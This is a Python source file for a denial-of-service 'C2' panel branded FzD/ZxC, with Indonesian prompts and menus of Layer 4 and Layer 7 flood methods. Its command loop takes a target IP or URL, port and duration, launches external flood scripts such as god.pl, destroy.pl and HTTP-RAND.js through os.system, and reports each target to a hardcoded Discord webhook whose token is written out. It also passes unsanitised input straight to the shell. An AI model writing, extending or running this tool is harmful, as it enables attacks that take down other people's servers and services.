import subprocess
import os
import time
import socket
import requests
import random
import getpass
import sys
import json
import platform

def send_discord_webhook(webhook_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
      
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys) 

def si():
    print(f"         \x1b]2;ZxC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255m<empty>       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255m<empty>            \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
                                          𝙇𝙖𝙮𝙚𝙧 7 𝙈𝙚𝙩𝙝𝙤𝙙
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► http-raw         ║ L ║  ► http-rand        ║ L ║  ► mix              ║
             ║  ► http-socket      ║   ║  ► cf-bypass        ║   ║  ► cf-pro           ║
             ║  ► ovh              ║   ║  ► cf-socket        ║   ║  ► httpflood        ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► crash            ║ L ║  ► https-spoof      ║ L ║  ► dandier          ║
             ║  ► hyper            ║   ║  ► killer           ║   ║  ► tlsvip           ║
             ║  ► slow             ║   ║  ► flood            ║   ║  ► stress           ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''')

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address
    
def layer4():
    clear()
    si()
    print(f'''
                                           𝙇𝙖𝙮𝙚𝙧 4 𝙈𝙚𝙩𝙝𝙤𝙙
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩═════════════════╗
             ╔══════════╩══════════╦═══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  ► udp              ║   ║  ► stress           ║   ║  ► samplite         ║
             ║  ► samp             ║ L ║  ► home             ║ L ║  ► samppro          ║
             ║  ► udpbypass        ║   ║  ► god              ║   ║  ► sampvip          ║
             ║  ► destroy          ║   ║  ► soon             ║   ║  ► soon             ║
             ╚═════════════════════╩═══╩═════════════════════╩═══╩═════════════════════╝
''') 

def get_device_name():
    hostname = socket.gethostname()
    return hostname

def menu(): 
     sys.stdout.write(f"         \x1b]2;FzD C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07") 
     clear() 
     print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to FzD C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: FzD Team \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\x1b[38;2;0;255;255m | \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mFzD \x1b[38;2;0;255;255m]') 
     print("") 
     print(""" 
                        ,     ,                        
                        |\---/|                   Support By : <177 Members & Dandier & Zelly Noy>
                       /  , , |                   Vip : <True>     
                  __.-'|  / \ /                   User : <Root>     
         __ ___.-'        ._O|                        
      .-'  '        :      _/                     ╒══════════════════════════════════════════════════════╕   
     / ,    .        .     |                        This tools is not for sell. Private tools and method.
    :  ;    :        :   _/                         Credit : ZxCDDoSS
    |  |   .'     __:   /                           Team   : FzDDoSS
    |  :   /'----'| \  |                          ╘══════════════════════════════════════════════════════╛
    \  |\  |      | /| |                        
     '.'| /       || \ |                        
     | /|.'       '.l \\_                        
     || ||             '-'                        
     '-''-'
 """)
 
def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@ka\x1b[38;2;0;150;88ml\x1b[38;2;0;113;133mi\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if "layer7" in cnc or "l7" in cnc or "LAYER7" in cnc or "L7" in cnc:
            layer7()
        elif "layer4" in cnc or "LAYER4" in cnc or "L4" in cnc or "l4" in cnc:
            layer4()
        elif "ports" in cnc or "frtt" in cnc or "FRTT" in cnc or "PRTZ" in cnc:
            ports()
        elif "tools" in cnc or "tool" in cnc or "TOOLS" in cnc or "TOOL" in cnc:
            tools()
# LAYER 4 METHODS   

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nGOD\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')
                
        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nDESTROY\n---------------\nTarget: {ip}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

# SPECIAL METHODS

# LAYER 7 METHODS
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-SOCKET\n---------------\nTarget: {url}\nPer: {per}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nHTTP-RAND\n---------------\nTarget: {url}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')


        elif "help" in cnc:
            print(f'''
LAYER7  ► MENAMPILKAN METHODE LAYER7
LAYER4  ► MENAMPILKAN METHODE LAYER4
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                
webhook_url = "https://discord.com/api/webhooks/1123200627351240776/HSNj_RHdhmjyBj6F2Zz3Pdb4XX6osq90liUFDXyHL7-gyRptyBwSKGvxQm1bF7Hx49Lm"

def login(): 
     clear() 
     user = "trial" 
     passwd = "trial" 
     username = input("⚡ Username: ") 
     password = getpass.getpass(prompt='⚡ Password: ') 
     if username != user or password != passwd: 
         print("") 
         print("⚡ Password Kamu salah!") 
         sys.exit(1) 
     elif username == user and password == passwd: 
         print("⚡ Welcome To FzD C2 Trial") 
         main() 
     
login()
